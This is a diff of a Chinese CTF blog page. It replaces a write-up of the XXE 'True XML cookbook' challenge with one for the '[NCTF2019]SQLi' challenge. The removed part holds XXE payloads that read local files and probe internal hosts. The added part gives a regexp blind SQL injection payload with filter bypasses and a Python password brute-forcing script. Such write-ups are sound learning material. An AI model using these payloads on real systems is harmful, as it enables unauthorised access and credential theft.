@@ -13,7 +13,7 @@
 
 
 
-<title>cookbook&#39; | Hexo</title>
+<title>&#39;[NCTF2019]SQLi&#39; | Hexo</title>
 
 
 
@@ -196,7 +196,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">cookbook&#39;</h1>
+            <h1 class="post-title">&#39;[NCTF2019]SQLi&#39;</h1>
             
                 <div class="post-meta">
                     
@@ -205,7 +205,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">May 29, 2024&nbsp;&nbsp;21:46:38</a>
+                        Date: <a href="#">June 6, 2024&nbsp;&nbsp;21:19:01</a>
                         </span>
                     
                     
@@ -221,39 +221,49 @@
         </header>
 
         <div class="post-content">
-            <h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><h3 id="xxe漏洞："><a href="#xxe漏洞：" class="headerlink" title="xxe漏洞："></a>xxe漏洞：</h3><p>与Fake XML Cookbook一样的类型，比fake难一些</p>
-<p>Fake XML Cookbook：</p>
-<p>这个是直接xxe漏洞：</p>
-<!DOCTYPE note [
-  <!ENTITY admin SYSTEM "file:///flag">
-<p>  ]&gt;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这个不能这样做：因为没有反应，反正是读文件</p>
-<p>这个读不了读别的：php:filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;doLogin.php</p>
-<p>获取源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">//doLogin.php</span><br><span class="line">&lt;?php\n/**</span><br><span class="line">* autor: c0ny1\n* date: 2018-2-7</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //\xe8\xb4\xa6\xe5\x8f\xb7</span><br><span class="line">$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //\xe5\xaf\x86\xe7\xa0\x81</span><br><span class="line">$result = null;</span><br><span class="line">libxml_disable_entity_loader(false);   // libxml_disable_entity_loader用于禁用或启用加载外部实体的功能。禁用（TRUE）或启用（FALSE）。</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">try&#123;</span><br><span class="line">	$dom = new DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);   // loadXML() 方法通过解析一个 XML 标签字符串来组成该文档</span><br><span class="line">	$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username = $creds-&gt;username;</span><br><span class="line">	$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">		$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);</span><br><span class="line">	&#125;else&#123;       // sprintf() 函数把格式化的字符串写入变量中。</span><br><span class="line">		$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">	$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>simplexml_import_dom() 函数把 DOM 节点转换为 SimpleXMLElement 对象。获取 DOM 文档节点并转换为 SimpleXML 节点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dom=new domDocument;</span><br><span class="line">$dom-&gt;loadXML(&quot;&lt;note&gt;&lt;to&gt;Tove&lt;/to&gt;&lt;from&gt;Jani&lt;/from&gt;&lt;/note&gt;&quot;);</span><br><span class="line">$x=simplexml_import_dom($dom);</span><br><span class="line">echo $x-&gt;from;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+            <h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p>源码泄露：</p>
+<p><img src="/../images/%5BNCTF2019%5DSQLi/1.png" alt="1"></p>
+<p>找到hint.php</p>
+<p>目的明确：</p>
+<p>只要密码是admin的密码就可以获得flag</p>
+<p>得到提示，这题过滤了好多关键字，只要password的密码等于admin的密码就能拿到flag了，但是怎么拿呢？看了dalao的wp才发现有regexp注入</p>
+<h3 id="regexp注入（正则注入）"><a href="#regexp注入（正则注入）" class="headerlink" title="regexp注入（正则注入）"></a>regexp注入（正则注入）</h3><p>这个注入方式呢相当于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1001.2101.3001.7020">布尔盲注</a>吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后^匹配e开头的password</p>
+<p><img src="/../images/%5BNCTF2019%5DSQLi/2.png" alt="2"></p>
+<p>再找个a开头的：没有</p>
+<p><img src="/../images/%5BNCTF2019%5DSQLi/3.png" alt="3"></p>
+<p>分析<br>回到题目里，提示给了串SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
 
 
-<p>输出类似：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jani</span><br></pre></td></tr></table></figure>
+<p>想要猜解admin的密码需要用到admin，可是题目过滤掉了admin，但是我们能用其他方法绕过，让username&#x3D;\，将语句后面的单引号给转义掉，我们可以构造这样的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||sql;%00</span><br></pre></td></tr></table></figure>
 
-<p>emm……没什么发现，但是读取源码的payload我还是在这里记录一哈。<br>这一次有所不同，上一题是我们读取文件得到flag。这次是刺探存活的服务器；</p>
-<p>其实很多人都小看了xxe漏洞，觉得它只可以读读文件啊什么的，其实大错特错，它还可以访问内网的主机，和ssrf利用的dict伪协议一样，都可以刺探存活的主机并且链接访问；也可以看作这个题是在打内网；</p>
-<p>好的我们老样子，我们利用ssrf读内网文件。先用file协议读取相关的文件 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;hosts；当我们读取到hosts文件的时候，我们会发现有几个ip地址，我们便来访问一下，（到这里应该可以猜到是在打内网了）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只能想到利用xxe进行ssrf打内网，扫描一下内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie</span><br></pre></td></tr></table></figure>
 
-<p>![2](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;2.png)![1](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;1.png)</p>
-<p>然后就是找内网服务器了：读这个<a target="_blank" rel="noopener" href="http://173.113.242.10/">http://173.113.242.10</a></p>
-<p>没找到，还在报错</p>
-<p>![3](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;3.png)</p>
-<p>换个服务器</p>
-<p><a target="_blank" rel="noopener" href="http://173.113.242.11/">http://173.113.242.11</a></p>
-<p>![11](..&#x2F;images&#x2F;[NCTF2019]True XML cookbook&#x2F;11.png)</p>
-<p>获取flag，完成啦</p>
+<p>因为题目过滤掉了空格，空格能用内联注释符&#x2F;**&#x2F;代替</p>
+<p>注释符#和–  被过滤掉了，这里用;%00截断注释后面的内容</p>
+<p>放入原查询语句相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||sql;%00&#x27;</span><br></pre></td></tr></table></figure>
+
+
+<p>即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where sql;%00</span><br></pre></td></tr></table></figure>
+
+
+<p> 这时候就能利用正则进行注入了构建payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^x&quot;;%00</span><br></pre></td></tr></table></figure>
+
+
+<p>相当于</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="comment">/**/</span>passwd<span class="comment">/**/</span>regexp<span class="comment">/**/</span>&quot;^x&quot;;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p>先用burpsuite跑一下（注意该一下爆破频率，不然429），看看正确与错误的情况，好写脚本跑<br><img src="/../images/%5BNCTF2019%5DSQLi/4.png" alt="4"></p>
+<p><img src="/../images/%5BNCTF2019%5DSQLi/5.png" alt="5"></p>
+<p>跑完后发现错误的话会有个js的弹窗出来，跑对了就没有 ，这里可以看到密码第一位是y（或Y，不区分大小写），以此写个python脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#buuctf web [NCTF2019]SQLi</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&quot;</span><br><span class="line">pw_fuzz = string.ascii_lowercase + string.digits + &quot;_&quot;      #密码字典：小写字母和数字还有下划线</span><br><span class="line">pw = &quot;&quot;     #admin的密码</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">while True:</span><br><span class="line">    for i in pw_fuzz:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &#x27;username&#x27;:&#x27;\\&#x27;,</span><br><span class="line">            &#x27;passwd&#x27;:&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;.format((pw+i))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        if &quot;alert&quot; not in res:</span><br><span class="line">            pw = pw + i</span><br><span class="line">            print(pw)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%5BNCTF2019%5DSQLi/6.png" alt="6"></p>
+<p>交到密码获得flag：</p>
+<p><img src="/../images/%5BNCTF2019%5DSQLi/7.png" alt="7"></p>
 
         </div>
 
@@ -268,7 +278,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://odiws.github.io/2024/05/29/cookbook-1/">http://odiws.github.io/2024/05/29/cookbook-1/</a></span>
+                        <span><a href="http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/">http://odiws.github.io/2024/06/06/[NCTF2019]SQLi/</a></span>
                     </p>
                 
                 
@@ -292,7 +302,9 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/buuctf%EF%BC%8Cxxe%E6%BC%8F%E6%B4%9E/"># buuctf，xxe漏洞</a>
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/regexp%E6%B3%A8%E5%85%A5/"># regexp注入</a>
                     
                         
                 </span>
@@ -305,10 +317,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2024/05/30/Web5-CyberPunk/">Web5]CyberPunk</a>
             
-            
-            <a class="next" rel="next" href="/2024/05/29/ctf%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/">'ctf工具总结'</a>
+            <a class="next" rel="next" href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/">'[RootersCTF2019]I_<3_Flask'</a>
             
         </section>
 
